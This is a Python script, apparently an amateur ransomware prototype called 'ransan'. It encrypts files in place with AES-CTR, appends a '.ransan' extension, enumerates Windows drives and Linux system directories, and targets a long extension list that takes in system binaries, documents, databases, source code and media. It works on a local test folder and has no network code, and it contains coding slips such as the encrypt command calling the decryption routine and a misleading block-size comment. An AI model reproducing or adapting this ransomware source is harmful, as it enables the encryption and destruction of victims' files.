#imported os and Crypto modules
import os
import os.path
from Crypto.Cipher import AES
from Crypto.Util import Counter
import socket
import time

#Encryption implementatin AES_CTR_MODE
def encryption(key, originalFile):
    counter = Counter.new(128) #Get the counter to activate the CTR_MODE
    #Specifies the type of encryption _Defin an AES object and CTR_MODE (CounTer Mode)
    crypto = AES.new(key, AES.MODE_CTR, counter= counter)
    #Check the file or not (If it exists, he executes the function)
    if os.path.exists(originalFile):
        #Get or Read the content of the original file with the binary
        file = open(originalFile, "r+b")
        blockSize = AES.block_size #Get Block size = 8 bytes
        plaintext = file.read(blockSize) #Read from file 8 bytes
        while plaintext:
            #Target = (-Length plaintext(Beginning with the first symbol or letter)), Whence 1
            file.seek(-len(plaintext), 1)
            #Get the contents of the plaintext, encrypting it, and placing it in the file
            file.write(crypto.encrypt(plaintext))
            #Read from file 8 bytes for each episode until the length of the plaintext = 0
            plaintext = file.read(blockSize)
        return key #Return the key vlaue to use in the decryption

def decryption(key, encryptedFile):
    counter = Counter.new(128) #Get the counter to activate the CTR_MODE
    #Specifies the type of decryption _Defin an AES object and CTR_MODE (CounTer Mode)
    decrypto = AES.new(key, AES.MODE_CTR, counter= counter)
    #Check the file or not (If it exists, he executes the function)
    if os.path.exists(encryptedFile):
        #Get or Read the content of the encrypted file with the binary
        file = open(encryptedFile, "r+b")
        blockSize = AES.block_size #Get Block size = 8 bytes
        ciphertext = file.read(blockSize) #Read from file 8 bytes
        while ciphertext:
            #Target = (-Length ciphertext(Beginning with the first symbol or letter)), Whence 1
            file.seek(-len(ciphertext), 1)
            #Get the contents of the chiphertext, decrypting it, and placing it in the file
            file.write(decrypto.decrypt(ciphertext))
            #Read from file 8 bytes for each episode until the length of the chipertext = 0
            ciphertext = file.read(blockSize)


#Rename the encrypted file into (originalFile + .ransan)
def renameFile(originalFile):
    os.rename(originalFile, originalFile + ".ransan")

#Restore the name of the encrypted file (originalFile - .ransan)
def nameRecovery(originalFile):
    os.rename(originalFile, originalFile.strip(".ransan"))


#Get the windows paritions
def partitionWindows():
    partitionList = []
    for p in range(65, 91):
        p = chr(p) + "://"
        if os.path.exists(p):
            partitionList.append(p)
    return partitionList

#Get the linux directory
def diresLinux():
    partitionList = ["/home", "/bin", "/boot", "/dev", "/etc", "/lastore", "/main", "/lib", "/lib64",
                     "/lost+found", "/media", "/mnt", "/opt", "/proc", "/recovery", "/root", "/run",
                     "/sbin", "/srv", "/sys", "/var"]
    return partitionList
  
#Get lists the files
def directoryFound(directoryFile):
    #A list of the types of files to be encrypted or decrypted
    extensions = [
    'exe', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img', 'dat', 'ransan',  # SYSTEM FILES [danger]
    'doc', 'docx', 'xls', 'xlsx', 'ppt','pptx', # Microsoft office
    'eps', 'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md', # OpenOffice, Adobe, Latex, Markdown, etc
    'yml', 'yaml', 'json', 'xml', 'csv', # structured data
    'db', 'sql', 'dbf', 'mdb', 'iso', 'webp', # databases and disc images
    'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css', # web technologies
    'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx', # C source code
    'java', 'class', 'jar', # java source code
    'ps', 'bat', 'vb', # windows based scripts
    'awk', 'sh', 'cgi', 'pl', 'ada', 'swift', # linux/mac based scripts
    'go', 'py', 'pyc', 'bf', 'coffee', # other source code files
    'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw', # images
    'mp3','mp4', 'm4a', 'aac','ogg','flac', 'wav', 'wma', 'aiff', 'ape', # music and sound
    'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp', # Video and movies
    'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak', 'sln', 'config', 'csproj',
    'cs', 'manifest', 'cache', 'resx', 'settings', 'db', 'bat', 'ai', 
    ]
    findDirectory = [] #list for storing existing files
    #To catch the path of any file in the directoryFile bearingone of the extenstion of the extensionList to the findDirectory
    for d, sb, f in os.walk(directoryFile):
        for file_name in f:
            full_path = os.path.join(d,file_name)
            ex = full_path.split(".")[-1]
            if ex in extensions:
                findDirectory.append(full_path)
    return findDirectory

######################################################################

#The main
def main():
    key_value = input("Enter the key>>")
    padding = lambda s : s + (32 - len(s) % 32) * "*"
    key = padding(key_value).encode('ascii')
    print("1- Encryption(en).\n2- Decryption(de).\n3- Change the key(ck).\n4- exit.\n\n")
    while True:
        cmd = input("command>>")
        if cmd == "en" or cmd == "encryption":
            folder = directoryFound(r"C:\Users\Lenovo\Desktop\test")
            #folder = directoryFound(r"/home/kali/Desktop/test")
            print("starting process...\n\n")
            for file in folder:
                decryption(key, file)
            for file in folder:
                renameFile(file)
            print("Encryption completed successfully\n")
        elif cmd == "de":
            folder = directoryFound(r"C:\Users\Lenovo\Desktop\test")
            #folder = directoryFound(r"/home/kali/Desktop/test")
            print("starting process...\n")
            for file in folder:
                decryption(key, file)
            for file in folder:
                nameRecovery(file)
            print("Decryption completed successfully")
        elif cmd == "ck":
            key_value = input("Enter the key>>")
            key = padding(key_value).encode('ascii')
            print("\nThe key has been changed successfully.\n")
        elif cmd == "exit" or cmd == "Exit":
            break
        else:
            print("\nError: The command you entered is wrong, try again.\n")

if __name__ == '__main__':
    main()
      
    
